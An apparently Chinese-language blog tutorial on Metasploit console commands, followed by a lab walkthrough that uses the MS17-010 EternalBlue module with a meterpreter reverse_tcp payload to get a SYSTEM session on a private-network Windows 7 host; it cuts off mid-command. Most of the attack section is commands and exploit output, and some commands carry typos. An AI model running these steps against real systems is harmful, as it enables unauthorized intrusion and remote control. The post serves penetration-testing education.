<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><title>Metasploit基本使用和控制台命令 - Guko's Blog</title><meta name="description" content="metasploit框架中包含数百个模块，在使用的过程中我们需要掌握一些特定的命令，以便更好的辅助我们来渗透MSF终端命令show expploits: 列出metasploit框架中的所有渗透攻击模块show auxiliary: 列出metaspLot框架中所有辅助攻击模块show option"><link type="text/css" rel="stylesheet" href="/css/pure.css?v=0.0.1"><link type="text/css" rel="stylesheet" href="/css/style.css?v=0.0.1"><script type="text/javascript" src="//cdn.bootcss.com/jquery/1.11.0/jquery.min.js"></script></head></html><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Metasploit基本使用和控制台命令</h1><a id="logo" href="/.">Guko's Blog</a></div><div id="nav-menu"><div class="bitcron_nav"><div class="site_nav_wrap"><div class="site_nav"><span class="a_container"><a href="/." class="selected active current">首页</a></span><span class="a_container"><a href="/archives/">归档</a></span><span class="a_container"><a href="/about/">关于</a></span><span class="a_container"><a href="/atom.xml">订阅</a></span></div></div></div></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Metasploit基本使用和控制台命令</h1><div class="post-meta">2020-02-14<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" type="text/javascript"></script><span class="meta-space">  |  </span><span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span><span> 浏览</span></span></div><!--文章内容--><div class="post-content"><p>metasploit框架中包含数百个模块，在使用的过程中我们需要掌握一些特定的命令，以便更好的辅助我们来渗透</p>
<a id="more"></a>

<h3 id="MSF终端命令"><a href="#MSF终端命令" class="headerlink" title="MSF终端命令"></a>MSF终端命令</h3><p><code>show expploits</code>: 列出metasploit框架中的所有渗透攻击模块</p>
<p><code>show auxiliary</code>: 列出metaspLot框架中所有辅助攻击模块</p>
<p><code>show options</code>: 参数（options）是metasploit框架中各个模块正确运行所需的各种设置</p>
<p>如果当前没有进入任何模块输入<code>show options</code>可以修改全局参数，进入到相对应的模块输入<code>shw options</code>修改其对应模块各种需要设置的参数。使用<code>back</code><br>命令可以返回metasploit的上一个状态</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; show options </span><br><span class="line"></span><br><span class="line">Global Options:</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">   Option            Current Setting    Description</span><br><span class="line">   ------            ---------------    -----------</span><br><span class="line">   ConsoleLogging    false              Log all console input and output</span><br><span class="line">   LogLevel          0                  Verbosity of logs (default 0, max 3)</span><br><span class="line">   MinimumRank       0                  The minimum rank of exploits that will run without explicit confirmation</span><br><span class="line">   Prompt            msf5               The prompt string</span><br><span class="line">   PromptChar        &gt;                  The prompt character</span><br><span class="line">   PromptTimeFormat  %Y-%m-%d %H:%M:%S  Format for timestamp escapes in prompts</span><br><span class="line">   SessionLogging    false              Log all input and output for sessions</span><br><span class="line">   TimestampOutput   false              Prefix all console output with a timestamp</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; back</span><br><span class="line">msf5 &gt;</span><br></pre></td></tr></table></figure>

<p>当我们想找某个特定的渗透攻击、辅助或攻击载荷的时候，使用搜索<code>search</code>命令提高效率。如我们找<code>ms17-010</code>的渗透攻击模块，可以使用<code>search ms17-010</code>就会列出辅助模块和渗透攻击模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search ms17-010</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                           Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                           ---------------  ----     -----  -----------</span><br><span class="line">   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   1  auxiliary/scanner/smb/smb_ms17_010                              normal   Yes    MS17-010 SMB RCE Detection</span><br><span class="line">   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+</span><br><span class="line">   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br></pre></td></tr></table></figure>

<p>找到攻击模块<code>exploit/windows/smb/ms17_010_eternalblue</code>后，使用<code>use</code>命令来加载模块，如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt;</span><br></pre></td></tr></table></figure>

<p>这里我们选择了<code>exploit/windows/smb/ms17_010_eternalblue</code>模块，这个时候终端中命令都会在这个攻击模块的环境中运行。在已选择的模块下输入<code>show options</code>会显示<code>ms17-010</code>模块所需的参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br></pre></td></tr></table></figure>

<p><code>show payloads</code>: 列出metasploit框架中所有攻击载荷</p>
<p>这个命令和<code>show options</code>一样，只会将与当前模块兼容的攻击载荷现实出来，输入如下命令可以查看所有活动状态的攻击载荷</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; show payloads</span><br></pre></td></tr></table></figure>

<p>在上一个步骤中我们通过<code>search</code>找到了<code>ms17-010</code>的攻击模块。现在我们用<code>show payloads</code>命令查找适合这个攻击模块的攻击载荷。显出出了针windwos平台的攻击载荷，<br>在metasploit中一般会根据环境识别出在一次特定渗透攻击中所需要使用的攻击载荷,这里是截取其列出的一小部分…</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show payloads </span><br><span class="line"></span><br><span class="line">Compatible Payloads</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">   #   Name                                        Disclosure Date  Rank    Check  Description</span><br><span class="line">   -   ----                                        ---------------  ----    -----  -----------</span><br><span class="line">   0   generic/custom                                               normal  No     Custom Payload</span><br><span class="line">   1   generic/shell_bind_tcp                                       normal  No     Generic Command Shell, Bind TCP Inline</span><br><span class="line">   2   generic/shell_reverse_tcp                                    normal  No     Generic Command Shell, Reverse TCP Inline</span><br></pre></td></tr></table></figure>

<p>接下来我们输入<code>set payload windows/x64/meterpreter/reverse_tcp</code>以选择<code>reverse_tcp</code>（反弹式TCP连接）攻击载荷，输入<code>show options</code>我们可以看到需要设置的一些参数,这个<br>例子中可以配置目标主机回连到攻击机的特定IP地址和端口号上，因此被称为反弹式的攻击载荷。在<code>Required</code>为<code>yes</code>的为必须设置，<code>no</code>则为可选项</p>
<p>看到我们需要对这个攻击载荷<code>LHOST</code>本地主机和<code>RHOST</code>（远程主机）进行设置，将<code>LHOST</code>设置为我们攻击机的IP地址，远程主机将反向连接到攻击机默认的TCP端口（<code>4444</code>）当然可以自己设置端口，因为这种反弹式的回连适合存在防火墙和<code>NAT</code>网关的环境，可以设置防火墙一般会允许通行的常用端口号（443、80、8080之类的）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br></pre></td></tr></table></figure>

<p><code>show targets</code>: 列出渗透攻击或模块所支持的目标平台</p>
<p><code>show targets</code>可以列出当前模块下渗透攻击所支持的平台，如果涉及多个版本、不同的补丁级别的时候，我们需要先确定目标机器的版本然后再用<code>set targeet</code>指定其相关系统版本对应的<code>Id</code>号。如下我们查看到支持<code>Windows 7 and Server 2008 R2 (x64) All Service Packs</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show targets </span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br></pre></td></tr></table></figure>

<p><code>info</code>: 展示出指定渗透攻击或模块的相关详细信息</p>
<p>展示出指定渗透攻击或模块的相关详细信息，如果已经选择的相关模块，则直接在其模块下输入<code>info</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">方法一：</span><br><span class="line">info exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">方法二：</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; info</span><br></pre></td></tr></table></figure>

<p><code>set</code>和<code>unset</code>: 设置和未设置</p>
<p>metasploit模块中所有参数只有两种状态：已设置<code>set</code>和未设置<code>unset</code>，使用<code>set</code>对命令可以对某个参数进行设置（同时启用该参数）使用<code>unset</code>命令可以禁用相关参数</p>
<p><code>setg</code>和<code>unsetg</code>： 这两个命令能对全局参数进行设置和清除，使用这个命令可以对那些经常使用但是又不常变动的参数进行设置</p>
<p><code>save</code>：在使用<code>setg</code>命令对全局参数进行设置后，可以使用<code>save</code>命令将当前的设置值保存下来，这样在下次启动MSF终端的时候还可以用这些值。在一些情况下需要恢复原始状态只需要把其对应的文件删除或移动到其他位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; save</span><br><span class="line">Saved configuration to: /root/.msf4/config</span><br></pre></td></tr></table></figure>

<h3 id="0x02-使用MS17-010攻击"><a href="#0x02-使用MS17-010攻击" class="headerlink" title="0x02 使用MS17-010攻击"></a>0x02 使用MS17-010攻击</h3><p>kali: 192.168.197.193<br>目标机: 192.168.197.195</p>
<p>第一步，使用<code>search</code>命令搜索<code>ms17-010</code>的攻击模块和辅助模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search ms17-010</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                           Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                           ---------------  ----     -----  -----------</span><br><span class="line">   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class="line">   1  auxiliary/scanner/smb/smb_ms17_010                              normal   Yes    MS17-010 SMB RCE Detection</span><br><span class="line">   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class="line">   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+</span><br><span class="line">   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br></pre></td></tr></table></figure>

<p>第二步，使用辅助模块<code>auxiliary/scanner/smb/smb_ms17_010</code>确认目标机是否存在对应的漏洞,扫描结果是<code>VULNERABLE to MS17-010</code>说明存在漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set RHOSTS 192.168.197.195</span><br><span class="line">RHOSTS =&gt; 192.168.197.195</span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting                                                 Required  Description</span><br><span class="line">   ----         ---------------                                                 --------  -----------</span><br><span class="line">   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts</span><br><span class="line">   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts</span><br><span class="line">   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check</span><br><span class="line">   RHOSTS       192.168.197.195                                                 yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT        445                                                             yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                                               no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                                      no        The password for the specified username</span><br><span class="line">   SMBUser                                                                      no        The username to authenticate as</span><br><span class="line">   THREADS      1                                                               yes       The number of concurrent threads</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.197.195:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.197.195:445   - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>

<p>第三步，使用<code>use</code>加载渗透攻击模块<code>exploit/windows/smb/ms17_010_eternalblue</code>,设置对应的参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 192.168.197.195</span><br><span class="line">RHOSTS =&gt; 192.168.197.195</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST 192.168.197.193</span><br><span class="line">LHOST =&gt; 192.168.197.193</span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS         192.168.197.195  yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.197.193  yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br></pre></td></tr></table></figure>

<p>使用<code>set RHOSTS</code>指定目标主机IP地址,接下来是设置攻击载荷<code>set payload windows/x64/meterpreter/reverse_tcp</code>这个载荷在攻击成功后，会动目标主机<br>发起一个反弹连接，连接到<code>LHOST</code>中指定的IP地址，因为要把shell反弹到攻击机上，因此<code>LHOST</code>设置为攻击机IP</p>
<p>第四步，使用<code>exploit</code>命令初始化攻击环境，并对目标主机发起攻击，成功后会返回一个<code>reverse_tcp</code>方式的<code>meterpreter会话</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.197.193:4444 </span><br><span class="line">[+] 192.168.197.195:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 192.168.197.195:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 192.168.197.195:445 - Connection established for exploitation.</span><br><span class="line">[+] 192.168.197.195:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 192.168.197.195:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 192.168.197.195:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 192.168.197.195:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 192.168.197.195:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 192.168.197.195:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.197.195:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.197.195:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 192.168.197.195:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 192.168.197.195:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 192.168.197.195:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 192.168.197.195:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 192.168.197.195:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 192.168.197.195:445 - Receiving response from exploit packet</span><br><span class="line">[+] 192.168.197.195:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 192.168.197.195:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 192.168.197.195:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.197.195</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.197.193:4444 -&gt; 192.168.197.195:65118) at 2020-02-14 13:46:51 +0800</span><br><span class="line">[+] 192.168.197.195:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.197.195:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.197.195:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<p>使用<code>session -l</code>命令远程运行meterpreter情况，<code>meterpreter -l-v</code>可以查看每一个meterpreter会话的详细信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions </span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                            Connection</span><br><span class="line">  --  ----  ----                     -----------                            ----------</span><br><span class="line">  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN-LTME4DTVE8Q  192.168.197.193:4444 -&gt; 192.168.197.195:65118 (192.168.197.195)</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions 